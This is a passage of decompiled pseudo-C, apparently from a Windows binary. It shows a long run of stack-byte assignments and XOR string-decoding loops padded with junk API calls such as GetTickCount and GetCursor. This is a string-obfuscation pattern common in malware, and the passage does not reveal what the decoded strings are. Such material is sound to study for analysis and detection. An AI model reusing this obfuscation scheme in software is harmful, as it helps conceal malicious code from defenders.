0x23;\n    var_8h._1_1_ = 0x1c;\n    var_8h._2_1_ = 0x19;\n    var_8h._3_1_ = 0x10;\n    var_4h._0_1_ = 0x51;\n    var_4h._1_1_ = 0x51;\n    var_4h._2_1_ = 0x55;\n    var_134h = 0x34367575;\n    var_130h._0_2_ = 0x7555;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x18);\n    iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    var_30h = 6;\n    iVar7 = 0;\n    do {\n        iVar5 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        if (iVar5 != 0xf93356) {\n            *(iVar7 + iVar4) = *(&var_134h + iVar7 % var_30h) ^ (iVar7 + iVar4)[&var_18h - iVar4];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 0x17);\n    fcn.0040468d();\n    var_34h = 5;\n    var_1ah = 5;\n    var_20h = 0x1a2e071d;\n    var_1ch = 0x273c;\n    var_19h = 1;\n    var_18h._0_1_ = 0x39;\n    var_18h._1_1_ = 0x3d;\n    var_18h._2_1_ = 0x27;\n    var_18h._3_1_ = 0xf;\n    var_14h._0_1_ = 0xe;\n    var_14h._1_1_ = 0x1b;\n    var_14h._2_1_ = 0x36;\n    var_14h._3_1_ = 0x1a;\n    var_10h._0_1_ = 0xd;\n    var_10h._1_1_ = 4;\n    var_10h._2_1_ = 0xc;\n    var_10h._3_1_ = 0x21;\n    var_ch._0_1_ = 0x1e;\n    var_ch._1_1_ = 0x10;\n    var_ch._2_1_ = 6;\n    var_ch._3_1_ = 0x1f;\n    var_8h._0_1_ = 0x26;\n    var_8h._1_1_ = 0x22;\n    var_8h._2_1_ = 7;\n    var_8h._3_1_ = 8;\n    var_4h._0_1_ = 0xc;\n    var_4h._1_1_ = 0x4f;\n    var_9ch = 0x696f624e;\n    var_98h._0_1_ = 0x4f;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x1f);\n    iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar5 = 0;\n    var_134h = iVar7;\n    var_24h = &var_20h - iVar7;\n    do {\n        iVar6 = (*_sym.imp.KERNEL32.dll_GetTickCount)();\n        if (iVar6 != 0xefab43) {\n            *(iVar5 + iVar7) = *(&var_9ch + iVar5 % var_34h) ^ (iVar5 + iVar7)[&var_20h - iVar7];\n        }\n        iVar5 = iVar5 + 1;\n    } while (iVar5 < 0x1e);\n    fcn.0040468d();\n    var_18h._0_1_ = 0x1e;\n    var_18h._1_1_ = 0x2a;\n    var_18h._2_1_ = 0x79;\n    var_18h._3_1_ = 0xd;\n    var_14h._0_1_ = 0;\n    var_14h._1_1_ = 0x26;\n    var_14h._2_1_ = 2;\n    var_14h._3_1_ = 0x50;\n    var_10h._0_1_ = 0xf;\n    var_10h._1_1_ = 0xc;\n    var_10h._2_1_ = 0x3f;\n    var_10h._3_1_ = 0x36;\n    var_ch._0_1_ = 0x65;\n    var_ch._1_1_ = 0x10;\n    var_ch._2_1_ = 10;\n    var_ch._3_1_ = 0x3b;\n    var_8h._0_1_ = 0x26;\n    var_8h._1_1_ = 0x59;\n    var_8h._2_1_ = 7;\n    var_8h._3_1_ = 4;\n    var_4h._0_1_ = 0x28;\n    var_4h._1_1_ = 0x4f;\n    var_94h = 0x62354f4d;\n    var_90h._0_1_ = 99;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x17);\n    iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar5 = 0;\n    var_9ch = iVar7;\n    var_24h = &var_18h - iVar7;\n    do {\n        iVar6 = (*_sym.imp.KERNEL32.dll_GetLogicalDrives)();\n        if (iVar6 != 0x2a14bf) {\n            *(iVar5 + iVar7) = *(&var_94h + iVar5 % var_34h) ^ (iVar5 + iVar7)[&var_18h - iVar7];\n        }\n        iVar5 = iVar5 + 1;\n    } while (iVar5 < 0x16);\n    fcn.0040468d();\n    var_18h._1_1_ = 5;\n    var_1ch = 0x2665;\n    var_1ah = 0xf;\n    var_19h = 0x24;\n    var_18h._0_1_ = 0x34;\n    var_18h._2_1_ = 0x53;\n    var_18h._3_1_ = 0x22;\n    var_14h._0_1_ = 0x35;\n    var_14h._1_1_ = 0x2f;\n    var_14h._2_1_ = 6;\n    var_14h._3_1_ = 2;\n    var_10h._0_1_ = 0x59;\n    var_10h._1_1_ = 0x37;\n    var_10h._2_1_ = 0x27;\n    var_10h._3_1_ = 0x1a;\n    var_ch._0_1_ = 0x25;\n    var_ch._1_1_ = 0x1e;\n    var_ch._2_1_ = 0x40;\n    var_ch._3_1_ = 0x2a;\n    var_8h._0_1_ = 0x2a;\n    var_8h._1_1_ = 0x2f;\n    var_8h._2_1_ = 0x30;\n    var_8h._3_1_ = 0x12;\n    var_4h._0_1_ = 0x36;\n    var_11ch = 0x4a464336;\n    var_118h._0_2_ = 0x7757;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x1a);\n    iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar5 = 0;\n    var_94h = iVar7;\n    var_24h = &var_1ch - iVar7;\n    do {\n        iVar6 = (*_sym.imp.KERNEL32.dll_GetTickCount)();\n        if (iVar6 != 0xd96adc) {\n            *(iVar5 + iVar7) = *(&var_11ch + iVar5 % var_30h) ^ (iVar5 + iVar7)[&var_1ch - iVar7];\n        }\n        iVar5 = iVar5 + 1;\n    } while (iVar5 < 0x19);\n    fcn.0040468d();\n    var_1ch = 0x722;\n    var_1ah = 0x62;\n    var_19h = 0x26;\n    var_18h._0_1_ = 4;\n    var_18h._1_1_ = 0x2e;\n    var_18h._2_1_ = 0x1d;\n    var_18h._3_1_ = 0xb;\n    var_14h._0_1_ = 0x54;\n    var_14h._1_1_ = 0x21;\n    var_14h._2_1_ = 3;\n    var_14h._3_1_ = 0x24;\n    var_10h._0_1_ = 0x15;\n    var_10h._1_1_ = 0x2b;\n    var_10h._2_1_ = 0x59;\n    var_10h._3_1_ = 0x38;\n    var_ch._0_1_ = 2;\n    var_ch._1_1_ = 0x35;\n    var_ch._2_1_ = 0x21;\n    var_ch._3_1_ = 0x10;\n    var_8h._0_1_ = 0x5e;\n    var_8h._1_1_ = 0x3e;\n    var_8h._2_1_ = 0x1e;\n    var_8h._3_1_ = 0x2d;\n    var_4h._0_1_ = 0x14;\n    var_4h._1_1_ = 5;\n    var_4h._2_1_ = 0x52;\n    var_4h._3_1_ = 0x48;\n    var_114h = 0x48376271;\n    var_110h._0_2_ = 0x4177;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x1d);\n    iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar5 = 0;\n    var_11ch = iVar7;\n    var_24h = &var_1ch - iVar7;\n    do {\n        iVar6 = (*_sym.imp.USER32.dll_GetMessageExtraInfo)();\n        if (iVar6 != 0x84bb98) {\n            *(iVar5 + iVar7) = *(&var_114h + iVar5 % var_30h) ^ (iVar5 + iVar7)[&var_1ch - iVar7];\n        }\n        iVar5 = iVar5 + 1;\n    } while (iVar5 < 0x1c);\n    fcn.0040468d();\n    var_1ch = 0x2e02;\n    var_1ah = 7;\n    var_19h = 0x55;\n    var_18h._0_1_ = 0x3b;\n    var_18h._1_1_ = 10;\n    var_18h._2_1_ = 0x38;\n    var_18h._3_1_ = 0x25;\n    var_14h._0_1_ = 0x2f;\n    var_14h._1_1_ = 0x75;\n    var_14h._2_1_ = 0x3b;\n    var_14h._3_1_ = 1;\n    var_10h._0_1_ = 0x3e;\n    var_10h._1_1_ = 0x3e;\n    var_10h._2_1_ = 0x24;\n    var_10h._3_1_ = 0x40;\n    var_ch._0_1_ = 8;\n    var_ch._1_1_ = 0x10;\n    var_ch._2_1_ = 0x38;\n    var_ch._3_1_ = 0x3d;\n    var_8h._0_1_ = 0x23;\n    var_8h._1_1_ = 0x58;\n    var_8h._2_1_ = 0x3d;\n    var_8h._3_1_ = 5;\n    var_4h._0_1_ = 0x34;\n    var_4h._1_1_ = 0x4b;\n    var_10ch = 0x344a4b51;\n    var_108h._0_2_ = 0x6258;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x1b);\n    iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar5 = 0;\n    var_114h = iVar7;\n    var_24h = &var_1ch - iVar7;\n    do {\n        iVar6 = (*_sym.imp.USER32.dll_GetCapture)();\n        if (iVar6 != 0xb7f0fc) {\n            *(iVar5 + iVar7) = *(&var_10ch + iVar5 % var_30h) ^ (iVar5 + iVar7)[&var_1ch - iVar7];\n        }\n        iVar5 = iVar5 + 1;\n    } while (iVar5 < 0x1a);\n    fcn.0040468d();\n    var_10h._0_1_ = 0x21;\n    var_10h._1_1_ = 0x22;\n    var_10h._2_1_ = 0;\n    var_10h._3_1_ = 0x39;\n    var_ch._0_1_ = 0x5b;\n    var_ch._1_1_ = 0;\n    var_ch._2_1_ = 0;\n    var_ch._3_1_ = 0x2e;\n    var_8h._0_1_ = 0x22;\n    var_8h._1_1_ = 0x33;\n    var_8h._2_1_ = 0x55;\n    var_8h._3_1_ = 0x35;\n    var_4h._0_1_ = 0x15;\n    var_4h._1_1_ = 0x22;\n    var_4h._2_1_ = 0x54;\n    var_104h = 0x5a544772;\n    var_100h._0_2_ = 0x5039;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x10);\n    iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar5 = 0;\n    var_10ch = iVar7;\n    var_24h = &var_10h - iVar7;\n    do {\n        iVar6 = (*_sym.imp.KERNEL32.dll_GetLogicalDrives)();\n        if (iVar6 != 0x498680) {\n            *(iVar5 + iVar7) = *(&var_104h + iVar5 % var_30h) ^ (iVar5 + iVar7)[&var_10h - iVar7];\n        }\n        iVar5 = iVar5 + 1;\n    } while (iVar5 < 0xf);\n    fcn.0040468d();\n    var_14h._0_1_ = 0x60;\n    var_14h._1_1_ = 0x20;\n    var_14h._2_1_ = 0x20;\n    var_14h._3_1_ = 0x16;\n    var_10h._0_1_ = 0xe;\n    var_10h._1_1_ = 0x36;\n    var_10h._2_1_ = 0x41;\n    var_10h._3_1_ = 0x2c;\n    var_ch._0_1_ = 7;\n    var_ch._1_1_ = 10;\n    var_ch._2_1_ = 0x3d;\n    var_ch._3_1_ = 0x31;\n    var_8h._0_1_ = 0x5a;\n    var_8h._1_1_ = 0x33;\n    var_8h._2_1_ = 0x1a;\n    var_8h._3_1_ = 0x1f;\n    var_4h._0_1_ = 8;\n    var_4h._1_1_ = 0x24;\n    var_4h._2_1_ = 0x56;\n    var_4h._3_1_ = 0x45;\n    var_fch = 0x73734533;\n    var_f8h._0_2_ = 0x436d;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x15);\n    iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar5 = 0;\n    var_104h = iVar7;\n    var_24h = &var_14h - iVar7;\n    do {\n        iVar6 = (*_sym.imp.USER32.dll_GetMessagePos)();\n        if (iVar6 != 0x21e465) {\n            *(iVar5 + iVar7) = *(&var_fch + iVar5 % var_30h) ^ (iVar5 + iVar7)[&var_14h - iVar7];\n        }\n        iVar5 = iVar5 + 1;\n    } while (iVar5 < 0x14);\n    fcn.0040468d();\n    var_1ch = 0x5714;\n    var_1ah = 0x2c;\n    var_19h = 0x56;\n    var_18h._0_1_ = 0x2c;\n    var_18h._1_1_ = 0x54;\n    var_18h._2_1_ = 8;\n    var_18h._3_1_ = 0x45;\n    var_14h._0_1_ = 0x16;\n    var_14h._1_1_ = 0x52;\n    var_14h._2_1_ = 0x35;\n    var_14h._3_1_ = 0x42;\n    var_10h._0_1_ = 0x2f;\n    var_10h._1_1_ = 0x5b;\n    var_10h._2_1_ = 8;\n    var_10h._3_1_ = 0x67;\n    var_ch._0_1_ = 0x35;\n    var_ch._1_1_ = 0x58;\n    var_ch._2_1_ = 0x31;\n    var_ch._3_1_ = 0x5b;\n    var_8h._0_1_ = 0x14;\n    var_8h._1_1_ = 0x52;\n    var_8h._2_1_ = 0x20;\n    var_8h._3_1_ = 0x54;\n    var_4h._0_1_ = 0x47;\n    var_f4h = 0x37783247;\n    var_f0h._0_2_ = 0x3147;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x1a);\n    iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar5 = 0;\n    var_fch = iVar7;\n    var_24h = &var_1ch - iVar7;\n    do {\n        iVar6 = (*_sym.imp.KERNEL32.dll_GetTickCount)();\n        if (iVar6 != 0x2610ec) {\n            *(iVar5 + iVar7) = *(&var_f4h + iVar5 % var_30h) ^ (iVar5 + iVar7)[&var_1ch - iVar7];\n        }\n        iVar5 = iVar5 + 1;\n    } while (iVar5 < 0x19);\n    fcn.0040468d();\n    var_18h._0_1_ = 0x1a;\n    var_18h._1_1_ = 0x28;\n    var_18h._2_1_ = 0x19;\n    var_18h._3_1_ = 0x3d;\n    var_14h._0_1_ = 0x23;\n    var_14h._1_1_ = 0x3c;\n    var_14h._2_1_ = 0xd;\n    var_14h._3_1_ = 0x3f;\n    var_10h._0_1_ = 0x3c;\n    var_10h._1_1_ = 0x24;\n    var_10h._2_1_ = 0x27;\n    var_10h._3_1_ = 0x2a;\n    var_ch._0_1_ = 0x19;\n    var_ch._1_1_ = 0x3f;\n    var_ch._2_1_ = 0x3c;\n    var_ch._3_1_ = 0x24;\n    var_8h._0_1_ = 0x2b;\n    var_8h._1_1_ = 0x34;\n    var_8h._2_1_ = 0x2c;\n    var_8h._3_1_ = 0x2a;\n    var_4h._0_1_ = 0x30;\n    var_4h._1_1_ = 0x52;\n    var_ech = 0x52554d49;\n    var_e8h._0_2_ = 0x5842;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x17);\n    iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar5 = 0;\n    var_f4h = iVar7;\n    var_24h = &var_18h - iVar7;\n    do {\n        iVar6 = (*_sym.imp.USER32.dll_GetOpenClipboardWindow)();\n        if (iVar6 != 0x935e08) {\n            *(iVar5 + iVar7) = *(&var_ech + iVar5 % var_30h) ^ (iVar5 + iVar7)[&var_18h - iVar7];\n        }\n        iVar5 = iVar5 + 1;\n    } while (iVar5 < 0x16);\n    fcn.0040468d();\n    var_1ch = 0x3316;\n    var_1ah = 0x62;\n    var_19h = 0x30;\n    var_18h._0_1_ = 0x45;\n    var_18h._1_1_ = 0x31;\n    var_18h._2_1_ = 0x33;\n    var_18h._3_1_ = 0x5c;\n    var_14h._0_1_ = 0x19;\n    var_14h._1_1_ = 0x44;\n    var_14h._2_1_ = 0x2a;\n    var_14h._3_1_ = 0x30;\n    var_10h._0_1_ = 0x58;\n    var_10h._1_1_ = 0x25;\n    var_10h._2_1_ = 0x53;\n    var_10h._3_1_ = 0x15;\n    var_ch._0_1_ = 0x24;\n    var_ch._1_1_ = 0x58;\n    var_ch._2_1_ = 0x3f;\n    var_ch._3_1_ = 0x5f;\n    var_8h._0_1_ = 0x29;\n    var_8h._1_1_ = 0x33;\n    var_8h._2_1_ = 0x56;\n    var_8h._3_1_ = 0x2c;\n    var_4h._0_1_ = 0x36;\n    var_8ch = 0x49315645;\n    var_88h._0_1_ = 0x36;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x1a);\n    iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar5 = 0;\n    var_ech = iVar7;\n    var_24h = &var_1ch - iVar7;\n    do {\n        iVar6 = (*_sym.imp.USER32.dll_DestroyCaret)();\n        if (iVar6 != 0xb3a9fa) {\n            *(iVar5 + iVar7) = *(&var_8ch + iVar5 % var_34h) ^ (iVar5 + iVar7)[&var_1ch - iVar7];\n        }\n        iVar5 = iVar5 + 1;\n    } while (iVar5 < 0x19);\n    fcn.0040468d();\n    var_18h._0_1_ = 0x19;\n    var_18h._1_1_ = 0xe;\n    var_18h._2_1_ = 0x65;\n    var_18h._3_1_ = 0x48;\n    var_14h._0_1_ = 0x2b;\n    var_14h._1_1_ = 0x41;\n    var_14h._2_1_ = 0x2f;\n    var_14h._3_1_ = 6;\n    var_10h._0_1_ = 0x42;\n    var_10h._1_1_ = 0x58;\n    var_10h._2_1_ = 0x35;\n    var_10h._3_1_ = 0x50;\n    var_ch._0_1_ = 0x1a;\n    var_ch._1_1_ = 0x19;\n    var_ch._2_1_ = 0x5f;\n    var_ch._3_1_ = 0x47;\n    var_8h._0_1_ = 0x31;\n    var_8h._1_1_ = 0x59;\n    var_8h._2_1_ = 0x2f;\n    var_8h._3_1_ = 0xc;\n    var_4h._0_1_ = 0x53;\n    var_4h._1_1_ = 0x31;\n    var_12ch = 0x31366b4a;\n    var_128h._0_2_ = 0x3558;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x17);\n    iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar5 = 0;\n    var_8ch = iVar7;\n    var_24h = &var_18h - iVar7;\n    do {\n        iVar6 = (*_sym.imp.USER32.dll_GetCursor)();\n        if (iVar6 != 0xab726d) {\n            *(iVar5 + iVar7) = *(&var_12ch + iVar5 % var_30h) ^ (iVar5 + iVar7)[&var_18h - iVar7];\n        }\n        iVar5 = iVar5 + 1;\n    } while (iVar5 < 0x16);\n    fcn.0040468d();\n    var_18h._3_1_ = 6;\n    var_20h = 0x14010d37;\n    var_1ch = 0x209;\n    var_1ah = 1;\n    var_19h = 0x3d;\n    var_18h._0_1_ = 3;\n    var_18h._1_1_ = 0x35;\n    var_18h._2_1_ = 0xd;\n    var_14h._0_1_ = 0x36;\n    var_14h._1_1_ = 10;\n    var_14h._2_1_ = 3;\n    var_14h._3_1_ = 0x34;\n    var_10h._0_1_ = 0x1a;\n    var_10h._1_1_ = 0x3e;\n    var_10h._2_1_ = 5;\n    var_10h._3_1_ = 3;\n    var_ch._0_1_ = 0x17;\n    var_ch._1_1_ = 0x1b;\n    var_ch._2_1_ = 1;\n    var_ch._3_1_ = 0x14;\n    var_8h._0_1_ = 0xf;\n    var_8h._1_1_ = 0x12;\n    var_8h._2_1_ = 1;\n    var_8h._3_1_ = 0x3d;\n    var_4h._0_1_ = 3;\n    var_4h._1_1_ = 1;\n    var_4h._2_1_ = 1;\n    var_4h._3_1_ = 0x68;\n    var_64h = 0x66516864;\n    var_60h._0_1_ = 0x66;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x21);\n    iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar5 = 0;\n    var_12ch = iVar7;\n    var_24h = &var_20h - iVar7;\n    do {\n        iVar6 = (*_sym.imp.USER32.dll_GetInputState)();\n        if (iVar6 != 0x933bea) {\n            *(iVar5 + iVar7) = *(&var_64h + iVar5 % var_34h) ^ (iVar5 + iVar7)[&var_20h - iVar7];\n        }\n        iVar5 = iVar5 + 1;\n    } while (iVar5 < 0x20);\n    fcn.0040468d();\n    var_20h = 0x5b23126b;\n    var_1ch = 0x714;\n    var_1ah = 0x5d;\n    var_19h = 0x16;\n    var_18h._0_1_ = 0x19;\n    var_18h._1_1_ = 0x50;\n    var_18h._2_1_ = 0x35;\n    var_18h._3_1_ = 0x14;\n    var_14h._0_1_ = 0x4b;\n    var_14h._1_1_ = 0x12;\n    var_14h._2_1_ = 0x3a;\n    var_14h._3_1_ = 0x47;\n    var_10h._0_1_ = 0x1e;\n    var_10h._1_1_ = 0x1a;\n    var_10h._2_1_ = 0x4a;\n    var_10h._3_1_ = 0x1e;\n    var_ch._0_1_ = 0x1e;\n    var_ch._1_1_ = 0x4c;\n    var_ch._2_1_ = 0x27;\n    var_ch._3_1_ = 7;\n    var_8h._0_1_ = 0x51;\n    var_8h._1_1_ = 1;\n    var_8h._2_1_ = 3;\n    var_8h._3_1_ = 0x59;\n    var_4h._0_1_ = 0x12;\n    var_4h._1_1_ = 0x12;\n    var_4h._2_1_ = 0x5d;\n    var_4h._3_1_ = 0x77;\n    var_13ch = 0x356a7738;\n    var_138h._0_2_ = 0x7577;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x21);\n    iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar5 = 0;\n    var_64h = iVar7;\n    var_24h = &var_20h - iVar7;\n    do {\n        iVar6 = (*_sym.imp.USER32.dll_GetMessageExtraInfo)();\n        if (iVar6 != 0x6ead4f) {\n            *(iVar5 + iVar7) = *(&var_13ch + iVar5 % var_30h) ^ (iVar5 + iVar7)[&var_20h - iVar7];\n        }\n        iVar5 = iVar5 + 1;\n    } while (iVar5 < 0x20);\n    fcn.0040468d();\n    var_10h._0_1_ = 5;\n    var_1ch = 0x1730;\n    var_1ah = 0x74;\n    var_19h = 0x35;\n    var_18h._0_1_ = 0x2d;\n    var_18h._1_1_ = 0xc;\n    var_18h._2_1_ = 0x17;\n    var_18h._3_1_ = 0x17;\n    var_14h._0_1_ = 0x67;\n    var_14h._1_1_ = 0x26;\n    var_14h._2_1_ = 0x2f;\n    var_14h._3_1_ = 8;\n    var_10h._1_1_ = 0x1b;\n    var_10h._2_1_ = 0x5b;\n    var_10h._3_1_ = 0x22;\n    var_ch._0_1_ = 0x18;\n    var_ch._1_1_ = 0x1f;\n    var_ch._2_1_ = 10;\n    var_ch._3_1_ = 4;\n    var_8h._0_1_ = 0x5e;\n    var_8h._1_1_ = 0x2b;\n    var_8h._2_1_ = 0x2d;\n    var_8h._3_1_ = 10;\n    var_4h._0_1_ = 6;\n    var_4h._1_1_ = 0x72;\n    var_124h = 0x47377263;\n    var_120h._0_2_ = 0x6d48;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x1b);\n    iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar5 = 0;\n    var_13ch = iVar7;\n    var_24h = &var_1ch - iVar7;\n    do {\n        iVar6 = (*_sym.imp.KERNEL32.dll_IsSystemResumeAutomatic)();\n        if (iVar6 != 0x33f9fa) {\n            *(iVar5 + iVar7) = *(&var_124h + iVar5 % var_30h) ^ (iVar5 + iVar7)[&var_1ch - iVar7];\n        }\n        iVar5 = iVar5 + 1;\n    } while (iVar5 < 0x1a);\n    fcn.0040468d();\n    var_1ch = 0x5c25;\n    var_1ah = 0x19;\n    var_19h = 0x3a;\n    var_18h._0_1_ = 3;\n    var_18h._1_1_ = 0x17;\n    var_18h._2_1_ = 0x4d;\n    var_18h._3_1_ = 0x3f;\n    var_14h._0_1_ = 0x18;\n    var_14h._1_1_ = 3;\n    var_14h._2_1_ = 4;\n    var_14h._3_1_ = 0x54;\n    var_10h._0_1_ = 0x3b;\n    var_10h._1_1_ = 0x26;\n    var_10h._2_1_ = 3;\n    var_10h._3_1_ = 0x18;\n    var_ch._0_1_ = 0x4d;\n    var_ch._1_1_ = 10;\n    var_ch._2_1_ = 0x3a;\n    var_ch._3_1_ = 0xf;\n    var_8h._0_1_ = 0;\n    var_8h._1_1_ = 0x50;\n    var_8h._2_1_ = 0x36;\n    var_8h._3_1_ = 0x2d;\n    var_4h._0_1_ = 1;\n    var_4h._1_1_ = 0x13;\n    var_4h._2_1_ = 0x39;\n    var_44h = 0x485a3976;\n    var_40h._0_1_ = 0x66;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x1c);\n    iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar5 = 0;\n    var_124h = iVar7;\n    var_24h = &var_1ch - iVar7;\n    do {\n        iVar6 = (*_sym.imp.USER32.dll_CountClipboardFormats)();\n        if (iVar6 != 0x511968) {\n            *(iVar5 + iVar7) = *(&var_44h + iVar5 % var_34h) ^ (iVar5 + iVar7)[&var_1ch - iVar7];\n        }\n        iVar5 = iVar5 + 1;\n    } while (iVar5 < 0x1b);\n    fcn.0040468d();\n    var_14h._0_1_ = 0x62;\n    var_14h._1_1_ = 0x33;\n    var_14h._2_1_ = 9;\n    var_14h._3_1_ = 0x2a;\n    var_10h._0_1_ = 0x30;\n    var_10h._1_1_ = 0x5a;\n    var_10h._2_1_ = 0x23;\n    var_10h._3_1_ = 0x3b;\n    var_ch._0_1_ = 0x1b;\n    var_ch._1_1_ = 0x21;\n    var_ch._2_1_ = 0x58;\n    var_ch._3_1_ = 0x20;\n    var_8h._0_1_ = 0x22;\n    var_8h._1_1_ = 0x27;\n    var_8h._2_1_ = 0x36;\n    var_8h._3_1_ = 0x56;\n    var_4h._0_1_ = 0x33;\n    var_4h._1_1_ = 0x4b;\n    var_a4h = 0x4b4b5631;\n    var_a0h._0_1_ = 0x53;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x13);\n    iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar5 = 0;\n    var_44h = iVar7;\n    var_24h = &var_14h - iVar7;\n    do {\n        iVar6 = (*_sym.imp.KERNEL32.dll_GetCurrentProcessId)();\n        if (iVar6 != 0x6d00c) {\n            *(iVar5 + iVar7) = *(&var_a4h + iVar5 % var_34h) ^ (iVar5 + iVar7)[&var_14h - iVar7];\n        }\n        iVar5 = iVar5 + 1;\n    } while (iVar5 < 0x12);\n    fcn.0040468d();\n    var_14h._0_1_ = 1;\n    var_14h._1_1_ = 0x54;\n    var_14h._2_1_ = 0x2a;\n    var_14h._3_1_ = 0x1d;\n    var_10h._0_1_ = 0x40;\n    var_10h._1_1_ = 0x26;\n    var_10h._2_1_ = 0x5e;\n    var_10h._3_1_ = 10;\n    var_ch._0_1_ = 0x1d;\n    var_ch._1_1_ = 99;\n    var_ch._2_1_ = 0x20;\n    var_ch._3_1_ = 0x58;\n    var_8h._0_1_ = 0xe;\n    var_8h._1_1_ = 0x11;\n    var_8h._2_1_ = 0x5f;\n    var_8h._3_1_ = 0x37;\n    var_4h._0_1_ = 0x56;\n    var_4h._1_1_ = 0x1d;\n    var_4h._2_1_ = 0x78;\n    var_b4h = 0x78783152;\n    var_b0h._0_1_ = 0x33;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x14);\n    iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar5 = 0;\n    var_a4h = iVar7;\n    var_24h = &var_14h - iVar7;\n    do {\n        iVar6 = (*_sym.imp.USER32.dll_GetDesktopWindow)();\n        if (iVar6 != 0x283808) {\n            *(iVar5 + iVar7) = *(&var_b4h + iVar5 % var_34h) ^ (iVar5 + iVar7)[&var_14h - iVar7];\n        }\n        iVar5 = iVar5 + 1;\n    } while (iVar5 < 0x13);\n    fcn.0040468d();\n    var_10h._3_1_ = 6;\n    var_14h._0_1_ = 0x25;\n    var_14h._1_1_ = 0xb;\n    var_14h._2_1_ = 0x3a;\n    var_14h._3_1_ = 0x3e;\n    var_10h._0_1_ = 0x1e;\n    var_10h._1_1_ = 2;\n    var_10h._2_1_ = 10;\n    var_ch._0_1_ = 0x21;\n    var_ch._1_1_ = 5;\n    var_ch._2_1_ = 0x26;\n    var_ch._3_1_ = 0x1c;\n    var_8h._0_1_ = 0;\n    var_8h._1_1_ = 0x20;\n    var_8h._2_1_ = 2;\n    var_8h._3_1_ = 0x1a;\n    var_4h._0_1_ = 0xb;\n    var_4h._1_1_ = 0xe;\n    var_4h._2_1_ = 0x33;\n    var_4h._3_1_ = 0x6b;\n    var_ach = 0x56696e76;\n    var_a8h._0_1_ = 0x6b;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x15);\n    iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar5 = 0;\n    var_b4h = iVar7;\n    var_24h = &var_14h - iVar7;\n    do {\n        iVar6 = (*_sym.imp.USER32.dll_GetMenuCheckMarkDimensions)();\n        if (iVar6 != 0xd62d2d) {\n            *(iVar5 + iVar7) = *(&var_ach + iVar5 % var_34h) ^ (iVar5 + iVar7)[&var_14h - iVar7];\n        }\n        iVar5 = iVar5 + 1;\n    } while (iVar5 < 0x14);\n    fcn.0040468d();\n    var_14h._0_1_ = 6;\n    var_14h._1_1_ = 0x33;\n    var_14h._2_1_ = 0x77;\n    var_14h._3_1_ = 0x36;\n    var_10h._0_1_ = 0x2d;\n    var_10h._1_1_ = 0x38;\n    var_10h._2_1_ = 0x32;\n    var_ch._0_1_ = 0x41;\n    var_ch._1_1_ = 0x3a;\n    var_ch._2_1_ = 0x39;\n    var_ch._3_1_ = 0x24;\n    var_8h._0_1_ = 0x39;\n    var_8h._1_1_ = 0x33;\n    var_8h._2_1_ = 0x54;\n    var_8h._3_1_ = 0x36;\n    var_4h._0_1_ = 0x4f;\n    var_e4h = 0x53335655;\n    var_e0h._0_2_ = 0x4d4f;\n    var_10h._3_1_ = var_14h;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x12);\n    iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar5 = 0;\n    var_ach = iVar7;\n    var_24h = &var_14h - iVar7;\n    do {\n        iVar6 = (*_sym.imp.KERNEL32.dll_GetLogicalDrives)();\n        if (iVar6 != 0xf6e33d) {\n            *(iVar5 + iVar7) = *(&var_e4h + iVar5 % var_30h) ^ (iVar5 + iVar7)[&var_14h - iVar7];\n        }\n        